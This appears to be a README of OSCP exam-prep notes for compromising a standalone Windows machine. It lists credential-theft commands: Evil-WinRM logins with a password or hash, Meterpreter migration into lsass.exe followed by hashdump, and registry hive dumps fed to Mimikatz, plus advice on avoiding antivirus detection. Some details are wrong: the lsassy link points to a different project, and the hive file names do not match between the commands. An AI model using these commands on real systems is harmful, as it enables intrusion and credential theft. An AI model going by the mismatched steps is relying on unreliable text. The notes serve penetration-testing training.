# Windows Resources 
Use this folder for triaging and compromising a standalone Windows box. For domain compromising, see [Active_Directory](https://github.com/Scr1ptK1ddie/OSCPprep/tree/main/ActiveDirectory) folder.   
## Contents 
- [Windows Resources](#windows-resources)
  * [Contents](#contents)
  * [Tools](#tools)
    + [Impacket](#impacket)
    + [Evil-WinRM](#evil-winrm)
    + [Metasploit and Meterpreter](#metasploit-and-meterpreter)
## Tools
### Impacket 
https://github.com/SecureAuthCorp/impacket

    apt install impacket-scripts

Local Locations:

    /usr/share/doc/python3-impacket/examples   
    
[lsassy](https://github.com/PowerShellMafia/PowerSploit): script to extract creds remotely using impacket  
      
### Evil-WinRM
Access port 5985. Use with a username / password or username / hash. 

    $ evil-winrm -u Administrator -p password -i 10.10.10.10    

### Metasploit and Meterpreter   
Meterpreter shell: need to migrate to lsass process to dump hashes, due to process permissions on Windows.         
    
    meter > migrate -N lsass.exe       
    meter > hashdump     
    
### Dump Hives and Extract with Mimikatz     
AV products will flag on Mimikatz so only do this if you are sure if won't (otherwise crack the hashes locally).     

    C:\Temp> reg save hklm\sam sam.hive && reg save hklm\system system.hiv     
    C:\Temp> c:\tools\mimikatz\x64\mimikatz.exe "lsadump::sam /sam:sam.hiv /system:system.hiv" "exit"   
    
    username:userid:LANMAN:NTHASH   #hash format when extracted  
